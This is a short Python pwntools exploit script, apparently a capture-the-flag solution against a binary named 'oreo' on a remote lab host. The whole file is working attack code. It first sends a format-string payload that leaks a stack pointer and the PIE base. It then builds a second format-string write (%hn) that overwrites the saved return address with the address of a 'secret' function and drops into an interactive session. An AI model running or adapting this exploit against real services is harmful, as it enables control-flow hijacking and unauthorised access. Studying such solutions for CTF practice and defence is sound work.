from pwn import *
#io = process("./oreo")
io = remote(b"10.100.0.17",12345)

io.sendlineafter(b">",b"1")
io.sendlineafter(b"operation:","%10$p%11$p")
io.sendlineafter(b">",b"2")
io.recvuntil(b"[ERROR] ")

stack_ret = int(io.recv(14),16) - 40
log.info("RET PTR @ " + hex(stack_ret))

pie = int(io.recv(14),16) - 0x168f
secret = pie + 0x19ed
log.info("PIE BASE: " + hex(pie))

io.sendlineafter(b">", b"1")

exploit  = b"%" + str(secret&0xffff).encode() + b"p"
exploit += b"%24$hn"
exploit  = exploit.ljust(16,b"A")
exploit += p64(stack_ret)
io.sendlineafter(b"operation:", exploit)
io.sendlineafter(b">",b"2")

io.interactive()
